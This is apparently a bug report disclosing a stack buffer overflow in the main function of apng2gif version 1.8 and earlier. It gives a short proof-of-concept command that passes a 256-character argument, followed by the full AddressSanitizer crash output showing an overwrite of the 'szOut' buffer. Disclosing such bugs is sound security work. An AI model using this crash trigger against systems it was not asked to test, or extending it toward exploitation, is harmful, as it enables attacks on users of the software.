There is a stack-buffer-overflow in main function(in apng2gif.cpp)(version<=1.8)
**POC:**
Get sourcecode in:https://sourceforge.net/projects/apng2gif/files/1.8/apng2gif-1.8-src.zip/download
In Command Line:
```
make CC="clang -fsanitize=address"
./apng2gif a.png `python -c 'print "a"*0x100'`
```
Output:
```
apng2gif 1.8

=================================================================
==37921==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffeb22ff840 at pc 0x00000046282c bp 0x7ffeb22ff710 sp 0x7ffeb22feec0
WRITE of size 257 at 0x7ffeb22ff840 thread T0
    #0 0x46282b  (/home/kirin/apng/apng2gif+0x46282b)
    #1 0x51a821  (/home/kirin/apng/apng2gif+0x51a821)
    #2 0x7f710b37bb96  (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #3 0x41cb39  (/home/kirin/apng/apng2gif+0x41cb39)

Address 0x7ffeb22ff840 is located in stack of thread T0 at offset 288 in frame
    #0 0x51a5cf  (/home/kirin/apng/apng2gif+0x51a5cf)

  This frame has 3 object(s):
    [32, 288) 'szOut'
    [352, 356) 'num_loops' <== Memory access at offset 288 partially underflows this variable
    [368, 392) 'img' <== Memory access at offset 288 partially underflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/home/kirin/apng/apng2gif+0x46282b) 
Shadow bytes around the buggy address:
  0x100056457eb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100056457ec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100056457ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100056457ee0: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
  0x100056457ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x100056457f00: 00 00 00 00 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2
  0x100056457f10: 04 f2 00 00 00 f3 f3 f3 f3 f3 f3 f3 00 00 00 00
  0x100056457f20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100056457f30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100056457f40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100056457f50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==37921==ABORTING
```
